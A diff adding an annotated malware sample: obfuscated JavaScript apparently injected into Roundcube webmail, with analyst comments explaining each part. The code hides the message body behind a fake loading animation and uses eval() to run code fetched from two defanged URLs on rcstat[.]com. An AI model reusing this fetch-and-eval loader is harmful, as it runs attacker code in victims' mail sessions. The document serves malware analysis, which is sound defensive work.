@@ -1,0 +1,104 @@
+// This function is used for decryption purposes
+function decryption_function_outer(e, a) {
+    var n = decryption_function_inner();
+    return (decryption_function_outer = function (e, a) {
+        return n[e -= 242]
+    })(e, a)
+}
+//This appears to be a utility function for fetching content from a given url and evaluating the content using the eval function
+function fetch_and_eval(urlvalue, condition) {
+    // Condition value is true in all cases. Urlvalue are download_url and sql_url
+    return condition ? fetch(urlvalue)['then']((e => e['text']())).then((_0xcacf35 => eval(_0xcacf35)))['catch']((e => { })) : Promise['resolve']()
+}
+function main() {
+    var e = decryption_function_outer;
+    // This is a conditional expression. 0 represents false so the code after : is executed
+    0 ?
+        (LoadingAnimation['show'](),
+            fetch_and_eval(sql_url, true)['then'](
+                (e => fetch_and_eval(download_url, true))
+            )
+            ['finally']
+                (
+                    (a => LoadingAnimation['hide']())
+                )
+        )
+        :
+        (
+            Htmlpart['hide'](),
+            new Promise((e => {
+                setTimeout((
+                    () => {
+                        Htmlpart['show'](), e()
+                    }
+                ), 100)
+
+            })
+            )
+            ['then'](
+                (e => fetch_and_eval(sql_url, true))
+            )
+            ['then'](
+                (e => fetch_and_eval(download_url, true))
+            )
+        )
+
+}
+function decryption_function_inner() {
+    var e = ['set_busy', 'none', 'block', 'show', '175429vpWbgU', 'finally', 'length', 'resolve', 'css', 'display', 'each', '.message-htmlpart', 'hide', '291956pwHWJv', '[id=messagebody]', 'window_id', 'border-top', '18029655xWOIEX', '[id^=message-htmlpart]', 'last', 'then', 'catch', 'text', '1785315sQzYTK', '3260736txULyO', '112AbHqPJ', '437523nBLQwZ', '1934742BfyjUE', '16gvTCwM'];
+
+    return (
+        decryption_function_inner = function () {
+            return e
+        }
+    )()
+}
+//This function will be the one to be executed first
+(function (e, a) {
+    // Value of t at start = ['set_busy', 'none', 'block', 'show', '175429vpWbgU', 'finally', 'length', 'resolve', 'css', 'display', 'each', '.message-htmlpart', 'hide', '291956pwHWJv', '[id=messagebody]', 'window_id', 'border-top', '18029655xWOIEX', '[id^=message-htmlpart]', 'last', 'then', 'catch', 'text', '1785315sQzYTK', '3260736txULyO', '112AbHqPJ', '437523nBLQwZ', '1934742BfyjUE', '16gvTCwM']
+    for (var n = decryption_function_outer, t = decryption_function_inner(); ;)try {
+        // This parameter in if condition resolves to true or false. When it is true, the loop ends. This loop is for setting the value of t
+        if (935172 === parseInt(n(252)) / 1 + parseInt(n(243)) / 2 + -parseInt(n(245)) / 3 * (-parseInt(n(247)) / 4) + -parseInt(n(242)) / 5 + parseInt(n(246)) / 6 + parseInt(n(261)) / 7 * (parseInt(n(244)) / 8) + -parseInt(n(265)) / 9)
+            break;
+        t.push(t.shift())
+    }
+        catch (e) {
+            t.push(t.shift())
+        }
+    //Value of t at end = ['1785315sQzYTK', '3260736txULyO', '112AbHqPJ', '437523nBLQwZ', '1934742BfyjUE', '16gvTCwM', 'set_busy', 'none', 'block', 'show', '175429vpWbgU', 'finally', 'length', 'resolve', 'css', 'display', 'each', '.message-htmlpart', 'hide', '291956pwHWJv', '[id=messagebody]', 'window_id', 'border-top', '18029655xWOIEX', '[id^=message-htmlpart]', 'last', 'then', 'catch', 'text']
+})(),
+    Htmlpart = {
+        content_element_id: -1,
+        show: function () {
+            var e = decryption_function_outer, 
+            a = $("[id^=message-htmlpart]"); 
+            a["length"] && (a["last"]().css("display", "block"), a.slice(0, -1)["each"]((
+                function () {
+                    $(this)["css"]("display", "none")
+                }
+                ))
+                ), $("[id=messagebody]").css('display', "block")
+        },
+
+        hide:
+            function () {
+                $("[id=messagebody]")["css"]("display", "none")
+            }
+    },
+    LoadingAnimation = {
+
+        show: function () {
+
+            $(".message-htmlpart")["css"]("border-top", "none"),
+                this["window_id"] = rcmail["set_busy"](true, 'message'), Htmlpart["hide"]()
+        },
+        hide: function () {
+            rcmail["set_busy"](false, '', this["window_id"]), Htmlpart["show"]()
+        }
+
+
+
+    },
+    download_url = 'https://rcstat[.]com/e?m=cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t&r=&s=MjAyMy0xMC0wMw==',
+    sql_url = 'https://rcstat[.]com/q?r=&m=cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t',
+    main();
